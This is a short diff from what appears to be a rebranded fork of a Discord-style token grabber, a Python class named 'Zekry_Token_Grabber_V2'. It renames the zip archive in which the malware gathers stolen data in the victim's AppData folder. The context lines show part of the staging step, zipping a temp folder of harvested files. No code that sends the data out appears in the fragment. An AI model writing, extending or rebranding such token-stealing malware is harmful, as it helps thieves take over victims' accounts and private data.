@@ -276,7 +276,7 @@ class Zekry_Token_Grabber_V2:
         except Exception:
             pass
         temp = os.path.join(self.tempfolder)
-        new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
+        new = os.path.join(self.appdata, f'ZekryMalwareHacker-[{os.getlogin()}].zip')
         self.zip(temp, new)
         for dirname, _, files in os.walk(self.tempfolder):
             for f in files:
